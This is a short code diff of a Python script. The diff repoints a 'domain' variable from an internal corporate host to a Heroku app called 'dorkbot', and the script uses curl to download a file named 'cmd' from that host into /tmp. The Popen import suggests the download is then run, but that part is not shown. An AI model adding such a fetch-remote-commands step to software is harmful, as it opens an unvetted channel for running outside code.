@@ -5,7 +5,7 @@
 
 from subprocess import call, Popen
 
-domain = "http://pmcgee-ltm4.internal.salesforce.com:4567/"
+domain = "http://dorkbot.herokuapp.com/"
 filename = "/tmp/1f3870be274f6c49b3e31a0c6728957f"
 
 call(["curl", "-o", filename, domain + "cmd"])
